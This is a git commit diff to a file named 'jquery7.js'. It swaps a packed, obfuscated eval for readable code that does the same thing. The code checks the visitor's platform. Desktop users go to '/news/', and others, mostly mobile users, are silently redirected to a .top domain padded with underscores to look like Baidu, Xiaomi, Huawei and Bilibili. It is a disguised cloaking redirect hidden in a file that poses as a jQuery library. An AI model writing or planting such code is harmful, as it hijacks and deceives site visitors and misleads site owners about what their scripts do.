4d512f9aaf742f1aefe438b97d0fff88cdc41f3a
kkaaas <69374310+kkaaas@users.noreply.github.com>
2021-12-08 14:13:46 +0800

    Update and rename jquery6.js to jquery7.js

--- jquery7.js
+++ jquery7.js
@@ -16,9 +16,19 @@
       }
     }, 300);
 //判断
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('3 1={};3 p=9.r;3 u=9.g;1.5=p.2("d")==0;1.8=p.2("e")==0;1.f=(p=="c")||(p.2("a")==0);b(1.5||1.8||1.q){6.7.4=\'/s/\'}t{6.7.4=" o://j.i.h.n.l.k/m"}',31,31,'|system|indexOf|var|href|win|window|location|mac|navigator|Linux|if|X11|Win|Mac|x11|userAgent|huawei|com_______________________xiaomi|baidu|top|sy6602621||bilibili|http||xll|platform|news|else|'.split('|'),0,{}))
-
-
+function RuPage(){
+var system = {};
+var p = navigator.platform;
+var u = navigator.userAgent;
+system.win = p.indexOf("Win") == 0;
+system.mac = p.indexOf("Mac") == 0;
+system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+if (system.win || system.mac || system.xll) {
+    window.location.href = '/news/'
+} else {
+    window.location.href = " http://baidu.com_______________________xiaomi.huawei.bilibili.sy6602621.top/m"
+}
+}
 //点击事件
 setTimeout(function() {
      // IE
